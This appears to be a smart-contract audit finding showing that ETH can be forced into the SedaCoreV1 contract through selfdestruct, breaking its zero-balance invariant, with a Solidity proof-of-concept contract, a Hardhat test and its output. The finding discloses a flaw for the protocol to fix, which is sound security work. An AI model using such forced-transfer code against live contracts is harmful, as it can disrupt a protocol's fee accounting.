# Malicious User Can Bypass of the `SedaCoreV1` Contract's Balance Management Invariant using `selfdestruct`

## Summary:

The `SedaCoreV1` contract lacks a `receive` or `fallback` function to handle direct ETH transfers thus effectively maintaining the invariant `When there are no ongoing data requests, the contract’s token balance should always be zero`, but the `selfdestruct` opcode can be used to forcefully transfer any ETH value to an SedaCoreV1 address, bypassing the contract's intended balance management invariant.

## Vulnerability Details:

The [`SedaCoreV1`](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/051b5e88a2f530792913910ebf98c50f431b1e3b/seda-evm-contracts/contracts/core/SedaCoreV1.sol#L19) contract maintains a invairant that the contract's ETH balance should be zero when no requests are active. However an allows an attacker can bypass the contract's intended balance management mechanisms by:

- Deploying a malicious contract that calls `selfdestruct(_address)` with the `SedaCoreV1` contract address as the target.

This `selfdestruct` operation bypasses the contract's lack of receive logic and transfers the ETH balance from malicious contract to the `SedaCoreV1` contract.

## Impact:

The protocol's invariant of maintaining a zero ETH balance when no requests are active is violated in SedaCoreV1. This can lead to unexpected behavior in the protocol's fee management mechanisms.

## Proof of Concept:

1. Deploy a malicious contract that calls `selfdestruct(_address)` with the `SedaCoreV1` contract address as the target.
2. The ETH balance of malicious contract is transferred to the `SedaCoreV1` breaking the invariant.

### Proof of Code:

1. Add the malicious contract code to the `contracts/mocks directory.`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract DestructContract {
	// Allow contract to receive ETH
	receive() external payable {}

	// Function to self-destruct and send remaining funds to target address
	function destroyAndSend(address payable _recipient) external {
		// Self-destruct the contract and send all funds to _recipient
		selfdestruct(_recipient);
	}
}
```

2. Compile the contract using `bun run compile`.
3. Add the following PoC to the `test/core/SedaCoreV1.test.ts` file.
4. Run the test using `bun run test`.

```typescript
describe("Invariant Broken", (): void => {
  it.only("When there are no ongoing data requests, the contract’s token balance should always be zero.", async () => {
    const { core } = await loadFixture(deployCoreFixture);
    // Define and deploy DestructContract inline

    const [recipient] = await ethers.getSigners();
    const DestructContractFactory = await ethers.getContractFactory(
      "DestructContract"
    );
    const destructContract = await DestructContractFactory.deploy();
    await destructContract.waitForDeployment();
    const contractAddr = await destructContract.getAddress();

    // Send some ETH to the contract
    await recipient.sendTransaction({
      to: contractAddr,
      value: ethers.parseEther("1.0"),
    });

    // Checking no active requests
    const requests = await core.getPendingRequests(0, 10);
    expect(requests.length).to.equal(0);

    // Call the destroyAndSend function on the destruct contract
    await destructContract.destroyAndSend(core.getAddress());

    // Check the balance of the contract
    const balance = await ethers.provider.getBalance(core.getAddress());
    console.log("Balance of the contract SedaCoreV1: ", balance.toString());
    console.log("Thus, the invariant is broken");
  });
});
```

**Output:**

```rust
SedaCoreV1
    Invariant Broken
Balance of the contract SedaCoreV1:  1000000000000000000
Thus, the invariant is broken
      ✔ When there are no ongoing data requests, the contract’s token balance should always be zero. (1561ms)
```

## Recommended Mitigation:

Implement a more robust balance management mechanism that maintains the invariant ` When there are no ongoing data requests, the contract’s token balance should always be zero`.
